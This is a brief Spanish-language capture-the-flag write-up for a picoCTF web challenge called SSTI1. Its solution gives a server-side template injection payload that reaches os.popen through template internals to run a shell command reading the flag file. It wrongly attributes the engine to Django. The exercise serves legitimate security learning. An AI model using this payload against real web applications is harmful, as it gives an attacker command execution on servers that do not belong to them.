## SSTI1
## Descripción
I made a cool website where you can announce whatever you want! Try it out!

Additional details will be available after launching your challenge instance.
## Solución
se soluciono inyectando esa sentencia ya que es un django por lo que permite leer el documento donde se encuentra la bandera 
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('cat flag').read() }}
## Notas
encontrado en linea
## Referencias
https://medium.com/@Kamal_S/picoctf-web-exploitation-ssti1-e2363b1885a0